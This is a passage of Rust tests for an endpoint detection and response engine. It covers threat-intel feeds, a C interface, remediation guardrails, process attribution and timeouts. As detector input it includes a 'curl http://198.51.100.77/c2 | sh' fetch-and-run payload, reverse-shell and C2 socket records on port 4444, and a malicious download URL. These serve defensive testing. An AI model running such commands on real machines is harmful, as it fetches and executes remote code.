            "Expected >= 2 intel feeds to hit (Builtin Vault + MockLocalTIP), got {}: {:?}",
            rep.feeds_hit_count,
            rep.feed_matches
        );
        assert!(
            rep.feed_matches
                .iter()
                .any(|m| m.feed_id == added_id && m.matched && m.raw_summary.contains("UnitTest-APT-Beacon")),
            "Mock HTTP feed must return UnitTest-APT-Beacon hit: {:?}",
            rep.feed_matches
        );
        assert!(
            rep.fused_threat_score >= 65.0,
            "Fused multi-feed score should be >= 65, got {}",
            rep.fused_threat_score
        );

        // 情报源开关、编辑、删除与重置默认
        ti.toggle_feed("FEED-OTX-PUBLIC");
        assert!(ti.feeds.iter().find(|f| f.feed_id == "FEED-OTX-PUBLIC").unwrap().enabled);
        assert!(ti.update_feed_config(&added_id, &feed_url, "new-key-000", Some(false)).is_ok());
        assert!(!ti.feeds.iter().find(|f| f.feed_id == added_id).unwrap().enabled);
        assert!(ti.remove_feed(&added_id));
        assert!(!ti.remove_feed("FEED-OFFLINE-VAULT")); // 内置核心库受保护不可删除
        let _ = ti.reset_default_feeds();
        assert_eq!(ti.enabled_feeds_count(), 2);

        // 5. 验证 LocalEdrEngine 全链路调查与一键封堵入库联动（沙盒禁落盘）
        let mut edr = LocalEdrEngine::new();
        edr.threat_intel.disable_persistence();
        edr.firewall_ips.disable_persistence();
        let initial_fw_rules = edr.firewall_ips.rules.len();
        let edr_rep = edr.run_threat_investigation(
            "185.220.101.42:4444",
            7788,
            "nc_reverse",
            None,
            Some("185.220.101.42"),
            Some(4444),
            Some(&mal_payload),
        );
        assert!(edr_rep.fused_threat_score >= 60.0);
        let block_msg = edr.block_from_investigation_report(&edr_rep.report_id);
        assert!(
            !block_msg.contains("[INTEL-WARN]"),
            "block_from_investigation_report failed: {}",
            block_msg
        );
        assert!(
            edr.firewall_ips.rules.len() > initial_fw_rules,
            "Blocking investigation report should create a dynamic Firewall rule"
        );
        assert!(edr.threat_intel.custom_malicious_iocs.iter().any(|x| x == "185.220.101.42"));

        stop_flag.store(true, Ordering::Relaxed);
        let _ = server_handle.join();
    }

    #[test]
    fn test_cross_os_dylib_abi_and_low_spec_optimization() {
        use std::ffi::{CStr, CString};
        use vnb_edr_gpui::platform::{
            app_state_dir, detect_host_hardware_profile, platform_shared_lib_filenames,
            DynamicLibrary, HostComputeTier,
        };

        // 1. 硬件画像探测与低配置自适应参数验证
        let hw = detect_host_hardware_profile();
        assert!(hw.logical_cores >= 1);
        assert!(hw.total_ram_mb > 0);
        assert!(hw.win_scan_interval_ms >= 1200);
        assert!(hw.edr_tick_interval_secs >= 8);
        assert!(
            !hw.tier.label().is_empty(),
            "Hardware compute tier label must not be empty"
        );
        if hw.tier == HostComputeTier::LowSpec {
            assert!(hw.prefer_low_gpu_overhead);
            assert!(hw.win_scan_interval_ms >= 2600);
            assert!(hw.edr_tick_interval_secs >= 15);
        }

        // 2. 跨操作系统动态链接库文件名与缓存状态目录（无残留写探针文件）
        let lib_names = platform_shared_lib_filenames("vnb_edr_gpui");
        assert!(!lib_names.is_empty());
        #[cfg(target_os = "macos")]
        assert_eq!(lib_names[0], "libvnb_edr_gpui.dylib");
        #[cfg(target_os = "windows")]
        assert!(lib_names.iter().any(|n| n == "vnb_edr_gpui.dll"));
        #[cfg(target_os = "linux")]
        assert_eq!(lib_names[0], "libvnb_edr_gpui.so");

        let state_dir_a = app_state_dir();
        let state_dir_b = app_state_dir();
        assert_eq!(state_dir_a, state_dir_b);
        if let Ok(entries) = std::fs::read_dir(&state_dir_a) {
            for ent in entries.flatten() {
                let name = ent.file_name().to_string_lossy().into_owned();
                assert!(
                    !name.starts_with(".vnb_write_probe_"),
                    "Cached app_state_dir left behind write probe file: {}",
                    name
                );
            }
        }
        assert!(DynamicLibrary::open("definitely_nonexistent_vnb_lib_xyz").is_none());

        // 3. 动态链接库 C-ABI 版本与无状态能力/T5B8检测导出验证
        let abi_ver = vnb_edr_gpui::vnb_edr_abi_version();
        assert_eq!(abi_ver >> 16, 2, "ABI major version must be 2");
        let caps_ptr = vnb_edr_gpui::vnb_edr_runtime_caps_json();
        assert!(!caps_ptr.is_null());
        let caps_json = unsafe { CStr::from_ptr(caps_ptr).to_string_lossy().into_owned() };
        vnb_edr_gpui::vnb_edr_free_string(caps_ptr);
        let caps_val: serde_json::Value =
            serde_json::from_str(&caps_json).expect("valid runtime caps JSON");
        assert!(caps_val.get("abi_version").is_some());
        assert!(caps_val.get("hardware_profile").is_some());
        assert!(caps_val.get("shared_lib_filenames").is_some());

        let t5_proc = CString::new("beacon_probe").unwrap();
        let payload = b"curl http://198.51.100.77/c2 | sh";
        let t5_ptr = vnb_edr_gpui::vnb_edr_t5b8_inspect_json(
            payload.as_ptr(),
            payload.len(),
            t5_proc.as_ptr(),
            0,
            4444,
            0,
        );
        assert!(!t5_ptr.is_null());
        let t5_json = unsafe { CStr::from_ptr(t5_ptr).to_string_lossy().into_owned() };
        vnb_edr_gpui::vnb_edr_free_string(t5_ptr);
        let t5_val: serde_json::Value =
            serde_json::from_str(&t5_json).expect("valid T5B8 JSON");
        assert!(t5_val.get("t5b8_hex").is_some());
        assert!(t5_val.get("mac_anomaly_score").is_some());
        assert!(t5_val.get("is_attack").is_some());

        // 4. 动态链接库引擎生命周期 + 沙盒遥测扫描 + 威胁调查 C-ABI 闭环
        let handle = vnb_edr_gpui::vnb_edr_engine_create();
        assert!(!handle.is_null());
        let sum_ptr = vnb_edr_gpui::vnb_edr_engine_scan_and_summary_json(handle);
        assert!(!sum_ptr.is_null());
        let sum_json = unsafe { CStr::from_ptr(sum_ptr).to_string_lossy().into_owned() };
        vnb_edr_gpui::vnb_edr_free_string(sum_ptr);
        let sum_val: serde_json::Value =
            serde_json::from_str(&sum_json).expect("valid engine summary JSON");
        assert_eq!(sum_val["status"].as_str(), Some("ok"));
        assert!(sum_val.get("live_processes").is_some());
        assert!(sum_val.get("firewall_ips_summary").is_some());
        assert!(sum_val.get("threat_intel_summary").is_some());

        let target_c = CString::new("198.51.100.77:4444").unwrap();
        let inv_ptr = vnb_edr_gpui::vnb_edr_engine_investigate_json(handle, target_c.as_ptr());
        assert!(!inv_ptr.is_null());
        let inv_json = unsafe { CStr::from_ptr(inv_ptr).to_string_lossy().into_owned() };
        vnb_edr_gpui::vnb_edr_free_string(inv_ptr);
        let inv_val: serde_json::Value =
            serde_json::from_str(&inv_json).expect("valid investigation JSON");
        assert!(
            inv_val["fused_threat_score"].as_f64().unwrap_or(0.0) >= 60.0,
            "Expected high threat score for builtin malicious IP via C-ABI: {}",
            inv_json
        );
        vnb_edr_gpui::vnb_edr_engine_destroy(handle);

        // 5. 验证跨平台 DynamicLibrary RAII 动态加载 + 符号解析 + Drop 自动卸载（避免测试宿主重复 dlopen 自身 ObjC ctor）
        #[cfg(target_os = "macos")]
        {
            let sys_lib = DynamicLibrary::open("libSystem.B.dylib")
                .expect("DynamicLibrary::open must resolve macOS libSystem.B.dylib");
            type GetPidFn = unsafe extern "C" fn() -> i32;
            let sym = unsafe { sys_lib.symbol::<GetPidFn>(b"getpid\0") }
                .expect("DynamicLibrary::symbol must resolve getpid");
            assert_eq!(unsafe { sym() } as u32, std::process::id());
        }
        #[cfg(target_os = "windows")]
        {
            let sys_lib = DynamicLibrary::open("kernel32.dll")
                .expect("DynamicLibrary::open must resolve Windows kernel32.dll");
            type GetPidFn = unsafe extern "system" fn() -> u32;
            let sym = unsafe { sys_lib.symbol::<GetPidFn>(b"GetCurrentProcessId\0") }
                .expect("DynamicLibrary::symbol must resolve GetCurrentProcessId");
            assert_eq!(unsafe { sym() }, std::process::id());
        }
    }

    #[test]
    fn test_forensic_lockfree_cache_and_parallel_intel() {
        use std::time::Instant;
        use vnb_edr_gpui::edr_engine::LocalEdrEngine;
        use vnb_edr_gpui::threat_intel::ThreatIntelEngine;

        let mut edr = LocalEdrEngine::new_sandboxed();
        let pid = std::process::id();
        let exe = std::env::current_exe()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_default();
        let ckey = format!("FORENSIC_TEST:{}:{}", pid, exe);

        // 1. 锁外并行取证作业管线 + 合成 llm_verdict_cache 回填 + 短周期缓存命中
        assert!(edr.check_forensic_cache(&ckey, pid, &exe).is_none());
        let job = edr.prepare_forensic_job(&ckey, pid, "vnb_test_proc", &exe, "forensic_perf");
        let bundle = LocalEdrEngine::execute_forensic_job_offline(job);
        assert!(bundle.report.contains("证据包已落盘"));
        let rep1 = edr.commit_forensic_bundle(bundle);
        assert!(
            edr.llm_verdict_cache
                .get(&ckey)
                .and_then(|v| v.agent_forensic_report.as_ref())
                .is_some(),
            "commit_forensic_bundle must populate llm_verdict_cache for UI immediate display"
        );
        assert!(edr.check_forensic_cache(&ckey, pid, &exe).is_some());

        let t_hit = Instant::now();
        let rep2 = edr.run_deep_forensic_collaboration(
            &ckey,
            pid,
            "vnb_test_proc",
            &exe,
            "forensic_perf",
        );
        assert_eq!(rep1, rep2);
        assert!(
            t_hit.elapsed().as_millis() < 25,
            "Cached forensic lookup should be sub-25ms, took {:?}",
            t_hit.elapsed()
        );

        // 2. 锁外并行情报联查管线验证
        let intel_job = edr.prepare_threat_intel_job("198.51.100.77:4444", None);
        let intel_out = ThreatIntelEngine::execute_job_offline(intel_job);
        let rep = edr.commit_threat_intel_job(intel_out);
        assert!(rep.fused_threat_score >= 60.0);
        assert!(!rep.report_id.is_empty());

        // 3. 锁外后台推演 / 模型自检 / 批量加固流水线验证
        use vnb_edr_gpui::edr_engine::ReasoningCallMode;
        edr.model_config.reasoning_mode = ReasoningCallMode::SimpleCliGateway;
        let dec_job = edr.prepare_test_decision_job(pid, "vnb_test_proc", &exe, "perf_check");
        let dec_out = LocalEdrEngine::execute_reasoning_job_offline(dec_job);
        let dec_summary = edr.commit_reasoning_job_output(dec_out);
        assert!(dec_summary.contains("[决策模型实测通过]"));

        let collab_job =
            edr.prepare_reasoning_collab_job(pid, "vnb_test_proc", &exe, "collab_perf_check");
        let collab_out = LocalEdrEngine::execute_reasoning_job_offline(collab_job);
        let collab_summary = edr.commit_reasoning_job_output(collab_out);
        assert!(collab_summary.contains("[协同流水线完成"));
        assert!(edr.llm_verdict_cache.contains_key(&format!("REAL_PROC:{}:{}", pid, exe)));

        let harden_job = edr.prepare_harden_vulns_job();
        let harden_out = LocalEdrEngine::execute_harden_vulns_offline(harden_job);
        let harden_msg = edr.commit_harden_vulns_result(harden_out);
        assert!(harden_msg.contains("[全局防护加固]"));
    }

    #[test]
    fn test_remediation_matrix_kill_and_risk_control() {
        use std::fs;
        use vnb_edr_gpui::contract::{HostContextProfile, PolicyAction};
        use vnb_edr_gpui::edr_engine::{LocalEdrEngine, NetworkSocketRecord};
        use vnb_edr_gpui::firewall_ips::FirewallAction;
        use vnb_edr_gpui::remediation_matrix::{
            ExecutionGate, KillChainAction, MatrixTargetContext, RiskTier, ThreatVector,
        };

        let mut edr = LocalEdrEngine::new_sandboxed();

        // 1. 验证系统核心与自身进程硬护栏：绝不允许对 PID 1 / 自身进程 / 系统目录核心服务执行挂起或强杀
        let (sys_plan, sys_msg) = edr.execute_matrix_remediation(
            1,
            "launchd",
            "/sbin/launchd",
            "异常外联探测",
            None,
            true,
        );
        assert_eq!(sys_plan.gate, ExecutionGate::BlockedByGuardrail);
        assert_eq!(sys_plan.effective_action, PolicyAction::A1DeferWait);
        assert!(sys_msg.contains("硬护栏拦截"));
        assert!(edr.remediation_matrix.blocked_by_guardrail_count >= 1);

        let self_pid = std::process::id();
        let (self_plan, _) = edr.execute_matrix_remediation(
            self_pid,
            "vnb_edr_gpui",
            "/tmp/fake_self_binary",
            "反弹 Shell 测试",
            None,
            true,
        );
        assert_eq!(self_plan.gate, ExecutionGate::BlockedByGuardrail);

        // 验证存在未保存用户文档的活跃宿主在自动模式下禁止 A4 强杀，降级为 A2 确认
        let doc_ctx = MatrixTargetContext {
            pid: 94111,
            ppid: 1,
            process_name: "OfficeHelper".to_string(),
            exe_path: "/Applications/OfficeHelper.app/Contents/MacOS/OfficeHelper".to_string(),
            code_signer: "Signed".to_string(),
            summary_hint: "弹窗广告劫持".to_string(),
            domain_hint: "内存与DYLD注入检测".to_string(),
            z3_malicious_prob: 0.72,
            has_reverse_shell: false,
            has_dyld_or_dll_inject: false,
            in_temp_or_hidden: false,
            intel_matched: false,
            is_benign_dev_tool: false,
            is_adware_popup: true,
            is_fim_credential_issue: false,
            wildcard_ports: vec![],
            remote_endpoints: vec![],
            persistence_paths: vec![],
            dropped_files: vec![],
            host_profile: HostContextProfile {
                has_open_user_document: true,
                active_document_hint: Some("quarterly_budget.xlsx".to_string()),
                is_critical_shell_host: false,
                has_main_work_window: true,
            },
            ancestry_chain: String::new(),
            cmdline: String::new(),
            cwd: String::new(),
            entry_script_or_config: String::new(),
            sha256_hex: String::new(),
            provenance_hint: String::new(),
        };
        let (doc_gate, doc_action, doc_reason) = edr
            .remediation_matrix
            .evaluate_requested_action(&doc_ctx, PolicyAction::A4RootPurge, false);
        assert_eq!(doc_gate, ExecutionGate::RequireConfirm);
        assert_eq!(doc_action, PolicyAction::A2SurgicalMute);
        assert!(doc_reason.is_some());

        // 2. 验证双因子禁生（路径 + SHA-256 防改名逃逸）、防火墙联动阻断、临时落地隔离与一键撤销回滚
        let tmp_base = std::env::temp_dir().join(format!("vnb_mtx_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&tmp_base);
        let payload_orig = tmp_base.join("evil_dropper.bin");
        let payload_renamed = tmp_base.join("renamed_clone.bin");
        let sample_bytes = b"VNB_SIM_MALWARE_ELF_REVSHELL_PAYLOAD_BYTES_9981";
        fs::write(&payload_orig, sample_bytes).expect("write test payload");
        fs::write(&payload_renamed, sample_bytes).expect("write renamed clone");
        let orig_str = payload_orig.to_string_lossy().to_string();
        let renamed_str = payload_renamed.to_string_lossy().to_string();

        edr.active_sockets.push(NetworkSocketRecord {
            socket_id: "sock-test-c2".to_string(),
            pid: 95432,
            process_name: "evil_dropper".to_string(),
            exe_path: orig_str.clone(),
            protocol: "TCP".to_string(),
            local_endpoint: "192.168.1.10:55123".to_string(),
            remote_endpoint: "203.0.113.77:4444".to_string(),
            remote_ip: "203.0.113.77".to_string(),
            local_port: 55123,
            remote_port: 4444,
            state: "ESTABLISHED".to_string(),
            is_wildcard_exposed: false,
            is_c2_suspicious: true,
            c2_reason: "C2 回连特征".to_string(),
            threat_score: 0.92,
            blocked: false,
            t5b8_hex: "00000000".to_string(),
            t5_regime: 2,
            t5b8_recon_error: 0.4,
            t5b8_attack_class: "ReverseShell".to_string(),
            proc_cmdline: String::new(),
            proc_cwd: String::new(),
            parent_summary: String::new(),
            service_unit: String::new(),
            config_path_hint: String::new(),
            ip_scope_hint: "公网 IP".to_string(),
            remote_domain_hint: String::new(),
        });

        let (exec_plan, exec_summary) = edr.execute_matrix_remediation(
            95432,
            "evil_dropper",
            &orig_str,
            "检测到 /dev/tcp/ 反弹 Shell 外联 C2",
            None,
            true,
        );
        assert_eq!(exec_plan.vector, ThreatVector::ReverseShell);
        assert_eq!(exec_plan.risk_tier, RiskTier::L4Critical);
        assert_eq!(exec_plan.effective_action, PolicyAction::A4RootPurge);
        assert!(exec_plan
            .ordered_steps
            .contains(&KillChainAction::BlockNetworkEndpoints));
        assert!(exec_plan
            .ordered_steps
            .contains(&KillChainAction::BlockSpawnPathAndHash));
        assert!(exec_summary.contains("MTX-L4-REVSHELL"));
        assert!(!edr.actuator.spawn_block_hashes.is_empty());
        assert!(edr
            .firewall_ips
            .rules
            .iter()
            .any(|r| r.remote_ip == "203.0.113.77" && r.action == FirewallAction::Block));
        assert!(edr.active_sockets.iter().any(|s| s.pid == 95432 && s.blocked));

        // 即使攻击者将原恶意文件复制改名为 renamed_clone.bin，SHA-256 禁生指纹库仍能命中拦截！
        let intercept = edr
            .actuator
            .enforce_spawn_block_on_pid(95433, &renamed_str);
        assert!(intercept.as_deref().unwrap_or("").contains("SHA256="));

        // 验证一键撤销回滚后解除禁生、解除 SHA-256 封禁，并放行改名副本
        let rollback_msg = edr
            .rollback_remediation_receipt(None)
            .expect("should rollback receipt");
        assert!(rollback_msg.contains("已物理撤销"));
        assert!(edr
            .actuator
            .enforce_spawn_block_on_pid(95433, &renamed_str)
            .is_none());

        // 3. 验证干跑演练模式与单轮自动查杀熔断器
        edr.remediation_matrix.policy.dry_run_mode = true;
        let (dry_plan, dry_msg) = edr.execute_matrix_remediation(
            96001,
            "dry_probe",
            &renamed_str,
            "临时目录木马测试",
            None,
            true,
        );
        assert_eq!(dry_plan.gate, ExecutionGate::DryRunObserve);
        assert!(dry_msg.contains("[DryRun·"));
        assert!(edr.remediation_matrix.dry_run_simulations_count >= 1);

        edr.remediation_matrix.policy.dry_run_mode = false;
        edr.remediation_matrix.policy.max_auto_kills_per_cycle = 2;
        edr.remediation_matrix.begin_cycle(1700000100);
        assert!(edr.remediation_matrix.record_auto_kill());
        assert!(!edr.remediation_matrix.record_auto_kill());
        assert!(edr.remediation_matrix.policy.circuit_breaker_tripped);

        let cb_ctx = MatrixTargetContext {
            pid: 96002,
            ppid: 1,
            process_name: "storm_child".to_string(),
            exe_path: renamed_str.clone(),
            code_signer: "Unsigned".to_string(),
            summary_hint: "临时目录载荷".to_string(),
            domain_hint: "进程谱系".to_string(),
            z3_malicious_prob: 0.90,
            has_reverse_shell: false,
            has_dyld_or_dll_inject: false,
            in_temp_or_hidden: true,
            intel_matched: false,
            is_benign_dev_tool: false,
            is_adware_popup: false,
            is_fim_credential_issue: false,
            wildcard_ports: vec![],
            remote_endpoints: vec![],
            persistence_paths: vec![],
            dropped_files: vec![],
            host_profile: HostContextProfile::default(),
            ancestry_chain: String::new(),
            cmdline: String::new(),
            cwd: String::new(),
            entry_script_or_config: String::new(),
            sha256_hex: String::new(),
            provenance_hint: String::new(),
        };
        let (cb_gate, cb_action, _) = edr.remediation_matrix.evaluate_requested_action(
            &cb_ctx,
            PolicyAction::A4RootPurge,
            false,
        );
        assert_eq!(cb_gate, ExecutionGate::RequireConfirm);
        assert_eq!(cb_action, PolicyAction::A2SurgicalMute);

        let _ = fs::remove_file(&payload_orig);
        let _ = fs::remove_file(&payload_renamed);
        let _ = fs::remove_dir_all(&tmp_base);
    }

    #[test]
    fn test_full_attribution_locator_and_provenance() {
        use std::collections::HashMap;
        use std::fs;
        use vnb_edr_gpui::contract::FEAT_DIM;
        use vnb_edr_gpui::edr_engine::{
            FimFileRecord, LiveProcessRecord, LocalEdrEngine, NetworkSocketRecord, PersistenceEntry,
            ThreatSeverity,
        };
        use vnb_edr_gpui::platform::{
            classify_ip_scope_hint, extract_entry_script_and_config,
            inspect_file_owner_and_provenance, parse_zone_identifier_content,
        };
        use vnb_edr_gpui::real_scanner::RealDesktopWindow;

        // 1. 多跳谱系链追踪（含防环保护）
        let mut tree: HashMap<u32, (u32, String)> = HashMap::new();
        tree.insert(1, (0, "launchd".to_string()));
        tree.insert(200, (1, "zsh".to_string()));
        tree.insert(300, (200, "python3".to_string()));
        tree.insert(400, (300, "worker".to_string()));
        let chain = LocalEdrEngine::build_ancestry_chain(400, &tree);
        assert_eq!(
            chain,
            "launchd(1) -> zsh(200) -> python3(300) -> worker(400)"
        );

        tree.insert(500, (501, "cycA".to_string()));
        tree.insert(501, (500, "cycB".to_string()));
        let cyc_chain = LocalEdrEngine::build_ancestry_chain(501, &tree);
        assert!(cyc_chain.contains("cycB(501)"));

        // 2. 解释器入口脚本与配置文件相对路径拼接
        let (entry, cfg, ws) = extract_entry_script_and_config(
            "/usr/bin/python3",
            "/usr/bin/python3 -u scripts/agent.py --config conf/c2.yaml",
            "/tmp/work_sandbox",
        );
        let entry_norm = entry.replace('\\', "/");
        let cfg_norm = cfg.replace('\\', "/");
        assert_eq!(entry_norm, "/tmp/work_sandbox/scripts/agent.py");
        assert_eq!(cfg_norm, "/tmp/work_sandbox/conf/c2.yaml");
        assert_eq!(ws, "/tmp/work_sandbox");

        // 3. IP 网段作用域标签与 Windows Zone.Identifier 解析
        assert!(classify_ip_scope_hint("127.0.0.1").contains("Loopback"));
        assert!(classify_ip_scope_hint("0.0.0.0").contains("Wildcard"));
        assert!(classify_ip_scope_hint("192.168.10.22").contains("RFC1918"));
        assert!(classify_ip_scope_hint("169.254.169.254").contains("元数据"));
        assert!(classify_ip_scope_hint("198.51.100.44").contains("公网"));

        let zi_raw = "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://cdn.evil.test/page\r\nHostUrl=https://cdn.evil.test/drop.exe\r\n";
        let zi_parsed = parse_zone_identifier_content(zi_raw).expect("zone parsed");
        assert!(zi_parsed.contains("ZoneId=3"));
        assert!(zi_parsed.contains("https://cdn.evil.test/drop.exe"));

        // 4. 真实落盘文件属主与来源属性采集 + 跨五大防御域全维定位合成
        let tmp_dir = std::env::temp_dir().join(format!("vnb_loc_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&tmp_dir);
        let sample_bin = tmp_dir.join("agent_worker.sh");
        fs::write(&sample_bin, b"#!/bin/sh\necho vnb_locator_test\n").expect("write temp script");
        let sample_path = sample_bin.to_string_lossy().to_string();
        let (owner, _prov) = inspect_file_owner_and_provenance(&sample_bin);
        assert!(!owner.is_empty());

        let mut edr = LocalEdrEngine::new_sandboxed();
        let dec = edr.decision_engine.evaluate_with_context(
            &[[0.1f32; FEAT_DIM]; SEQ_LEN],
            &HostContextProfile::default(),
            "python3",
            &sample_path,
            "locator test",
        );
        edr.live_processes.push(LiveProcessRecord {
            pid: 77440,
            ppid: 300,
            uid: 501,
            cpu_pct: 4.2,
            rss_mb: 18.0,
            comm: "python3".to_string(),
            exe_path: sample_path.clone(),
            cmdline: format!("/usr/bin/python3 {} --config /tmp/agent.json", sample_path),
            parent_comm: "zsh".to_string(),
            code_signer: "Unsigned".to_string(),
            binary_entropy: 0.72,
            has_dyld_inject: true,
            dyld_env_detail: "DYLD_INSERT_LIBRARIES=/tmp/hook.dylib".to_string(),
            in_temp_or_hidden: true,
            has_dangerous_flags: false,
            is_supply_chain_anomaly: true,
            is_reverse_shell_pattern: false,
            active_sockets_count: 1,
            wildcard_listen_ports: vec![],
            frame_features: [0.1; FEAT_DIM],
            decision: dec.clone(),
            severity: ThreatSeverity::High,
            status_note: "检测到注入与外联".to_string(),
            username: "tester".to_string(),
            tty: "ttys002".to_string(),
            elapsed_time: "01:12".to_string(),
            ancestry_chain: chain,
            cwd: tmp_dir.to_string_lossy().to_string(),
            entry_script: sample_path.clone(),
            injected_modules: vec!["/tmp/hook.dylib".to_string()],
            binary_sha256: "deadbeef12345678".to_string(),
        });
        let fake_plist_path = tmp_dir
            .join("com.evil.worker.plist")
            .to_string_lossy()
            .to_string();
        edr.persistence_entries.push(PersistenceEntry {
            entry_id: "P-LOC1".to_string(),
            kind: "User LaunchAgent".to_string(),
            label: "com.evil.worker".to_string(),
            config_path: fake_plist_path,
            target_exec: sample_path.clone(),
            args_summary: "--daemon".to_string(),
            code_signer: "Unsigned".to_string(),
            run_at_load: true,
            keep_alive: true,
            fingerprint_hex: "ABCD1234".to_string(),
            payload_entropy: 0.5,
            is_suspicious: true,
            risk_reason: "test".to_string(),
            unloaded: false,
            active_pid: Some(77440),
            active_process_name: "python3".to_string(),
            target_sha256: "deadbeef12345678".to_string(),
            file_owner: owner.clone(),
            provenance_hint: "Quarantine[curl(0081)]".to_string(),
            raw_trigger_line: sample_path.clone(),
        });
        edr.active_sockets.push(NetworkSocketRecord {
            socket_id: "SOCK-77440-1".to_string(),
            pid: 77440,
            process_name: "python3".to_string(),
            exe_path: sample_path.clone(),
            protocol: "TCP".to_string(),
            local_endpoint: "10.0.0.8:54321".to_string(),
            remote_endpoint: "198.51.100.44:4444".to_string(),
            remote_ip: "198.51.100.44".to_string(),
            local_port: 54321,
            remote_port: 4444,
            state: "ESTABLISHED".to_string(),
            is_wildcard_exposed: false,
            is_c2_suspicious: true,
            c2_reason: "C2 out".to_string(),
            threat_score: 0.91,
            blocked: false,
            t5b8_hex: "0xAA11".to_string(),
            t5_regime: 2,
            t5b8_recon_error: 0.4,
            t5b8_attack_class: "C2".to_string(),
            proc_cmdline: String::new(),
            proc_cwd: tmp_dir.to_string_lossy().to_string(),
            parent_summary: "zsh(200) -> python3(77440)".to_string(),
            service_unit: "com.evil.worker (User LaunchAgent)".to_string(),
            config_path_hint: "/tmp/agent.json".to_string(),
            ip_scope_hint: "公网 IP".to_string(),
            remote_domain_hint: "c2.evil.test".to_string(),
        });
        edr.fim_records.push(FimFileRecord {
            path: sample_path.clone(),
            category: "临时目录".to_string(),
            size_bytes: 32,
            unix_mode_octal: "0755".to_string(),
            modified_epoch: 1700000000,
            baseline_hash_hex: "-".to_string(),
            current_hash_hex: "1234".to_string(),
            shannon_entropy: 0.6,
            is_executable_header: true,
            status: "ALERT".to_string(),
            is_alert: true,
            alert_reason: "drop".to_string(),
            quarantined: false,
            sha256_hex: "deadbeef12345678".to_string(),
            file_owner: owner.clone(),
            provenance_hint: "Quarantine[curl(0081)]".to_string(),
            holder_processes: vec!["python3 (PID=77440)".to_string()],
        });
        edr.desktop_windows.push(RealDesktopWindow {
            window_id: 9012,
            pid: 77440,
            parent_pid: 300,
            thread_id: 44,
            app_name: "python3".to_string(),
            exe_path: sample_path.clone(),
            window_title: "Fake Update Alert".to_string(),
            bounds: (0, 0, 480, 320),
            is_topmost_floating: true,
            is_tool_or_popup: true,
            input_idle_decay: 0.9,
            frame_features: [0.1; FEAT_DIM],
            decision: dec,
            is_ad_popup_candidate: true,
            plain_reason: "Overlay".to_string(),
        });

        let loc = edr.resolve_target_locator(77440, "python3", &sample_path, "");
        assert_eq!(loc.pid, 77440);
        assert!(loc.ancestry_chain.contains("zsh(200)"));
        assert_eq!(loc.entry_script_or_config, sample_path);
        assert!(loc.service_unit.contains("com.evil.worker"));
        assert!(loc.injected_modules.iter().any(|m| m == "/tmp/hook.dylib"));
        assert!(loc.holder_processes.iter().any(|h| h.contains("77440")));
        assert!(loc.window_summary.contains("WindowID=9012"));
        assert!(loc.network_endpoints.iter().any(|e| e.contains("c2.evil.test")));

        let (l1, l2) = loc.compact_two_lines();
        assert!(l1.contains("CWD"));
        assert!(l2.contains("SHA256"));
        let clip_text = loc.to_clipboard_report();
        assert!(clip_text.contains("父子谱系链"));
        assert!(clip_text.contains("WindowID=9012"));

        // 5. 验证处置回执自动携带多维定位摘要
        let (_plan, _msg) = edr.execute_matrix_remediation(
            77440,
            "python3",
            &sample_path,
            "临时目录木马执行测试",
            None,
            true,
        );
        let latest_receipt = edr.actuator.receipts.first().expect("receipt recorded");
        assert!(latest_receipt.attribution_summary.contains("工作目录"));
        let _ = edr.rollback_remediation_receipt(Some(latest_receipt.receipt_id));

        let _ = fs::remove_file(&sample_bin);
        let _ = fs::remove_dir_all(&tmp_dir);
    }

    #[test]
    fn test_ui_shell_fast_startup_and_command_timeout() {
        use std::time::Instant;
        use vnb_edr_gpui::edr_engine::LocalEdrEngine;

        // 1. 验证 OS 子进程硬超时封装：正常命令毫秒返回，阻塞命令按阈值强杀防主线程卡死
        #[cfg(not(target_os = "windows"))]
        {
            use std::process::Command;
            use vnb_edr_gpui::platform::run_command_with_timeout;

            let mut fast_cmd = Command::new("echo");
            fast_cmd.arg("vnb_ok");
            let out = run_command_with_timeout(&mut fast_cmd, 1000)
                .expect("fast command should complete before timeout");
            assert!(out.status.success());
            assert!(String::from_utf8_lossy(&out.stdout).contains("vnb_ok"));

            let t0 = Instant::now();
            let mut slow_cmd = Command::new("sleep");
            slow_cmd.arg("5");
            let timed_out = run_command_with_timeout(&mut slow_cmd, 120);
            assert!(
                timed_out.is_none(),
                "sleeping subprocess must be terminated on timeout"
            );
            assert!(
                t0.elapsed().as_millis() < 1500,
                "timeout wait exceeded bound: {:?}",
                t0.elapsed()
            );
        }

        // 2. 验证极速 UI 冷启动壳：零阻塞，不触发同步 OS 扫描
        let t_shell = Instant::now();
        let shell_edr = LocalEdrEngine::new_ui_shell();
        assert!(
            shell_edr.live_processes.is_empty(),
            "new_ui_shell() must not synchronously scan OS processes"
        );
        assert!(
            t_shell.elapsed().as_millis() < 2000,
            "UI shell init should stay sub-2s even on cold test host, took {:?}",
            t_shell.elapsed()
        );

        // 3. 验证后台异步巡检三段式闭合与用户态白名单/策略开关保留
        let mut edr = LocalEdrEngine::new_sandboxed();
        edr.live_processes.clear();
        edr.trusted_pids.insert(999_991);
        edr.remediation_matrix.policy.dry_run_mode = true;

        let req = edr.prepare_background_scan(true);
        let res = LocalEdrEngine::execute_background_scan_offline(req);
        edr.commit_background_scan(res);

        assert!(
            !edr.live_processes.is_empty(),
            "background scan commit must repopulate live_processes"
        );
        assert!(
            edr.trusted_pids.contains(&999_991),
            "trusted_pids must survive background scan commit"
        );
        assert!(
            edr.remediation_matrix.policy.dry_run_mode,
            "user policy flags must survive background scan commit"
        );
    }
}
